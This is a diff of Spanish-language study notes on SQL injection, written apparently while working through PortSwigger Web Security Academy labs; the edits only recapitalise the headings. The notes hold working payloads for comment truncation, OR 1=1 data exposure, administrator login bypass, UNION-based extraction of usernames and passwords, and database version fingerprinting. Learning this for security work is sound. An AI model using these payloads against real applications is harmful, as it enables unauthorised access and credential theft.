@@ -1,4 +1,4 @@
-# SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
+# SQL INJECTION VULNERABILITY IN WHERE CLUASE ALLOWING RETRIEVAL OF HIDDEN DATA
 
 -- / en lenguaje SQL es para comentar una oracion de manera que lo que se agregue despues del simbolo "--" no es leido.
 ex: SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
@@ -11,14 +11,14 @@ ex: SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
 https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data
 https://0a94007003d97f86c44635900063000b.web-security-academy.net/filter?category=%27%20or%201=1%20--%27
 
-# SQL injection vulnerability allowing login bypass
+# SQL INJECTION VULNERABILITY ALLOWING LOGIN BYPASS [Subverting application logic]
 
 administrator-- / cuando el login form es vulnerable es importante intentar como primera opcion una vez se tenga un usuario, intentar hacer bypass del
 password como tal. agregando los flags de comentar, hace que ignore el resto del query en background.
 
 ex: SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
 
-# Retrieving data from other database tables
+# RETRIEVING DATA FROM OTHER DATABASE TABLES
 
 ex: SELECT name, description FROM products WHERE category = 'Gifts' ' UNION SELECT username, password FROM users--
 
@@ -53,7 +53,7 @@ al final para que funcione.
 
 ' UNION SELECT NULL FROM DUAL--
 
-# Examining the database in SQL injection attacks
+# EXAMINING THE DATABASE IN SQL INJECTION ATTACKS
 
 existen distintos motores de bases de datos, los mas comunes son: Microsoft, MySQL, Oracle y PostgreSQL. cada uno tiene su manera de mostrar la informacion,
 para mostrar la informacion es necesario hacer uso del [UNION] flag.
@@ -64,3 +64,7 @@ Oracle : SELECT * FROM v$version
 PostgreSQL : SELECT version()
 
 ' UNION SELECT @@version--
+
+
+
+
